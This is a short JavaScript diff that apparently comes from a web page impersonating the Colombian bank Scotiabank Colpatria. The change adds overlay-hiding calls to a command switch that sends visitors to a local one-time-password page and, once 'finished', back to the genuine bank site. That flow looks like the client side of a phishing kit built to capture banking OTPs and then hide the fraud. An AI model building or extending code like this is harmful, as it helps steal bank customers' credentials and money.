@@ -101,10 +101,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_otp':
                 console.log('🔢 Redirigiendo a otp.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a scotiabankcolpatria.com');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.scotiabankcolpatria.com/';
                 break;
             default:
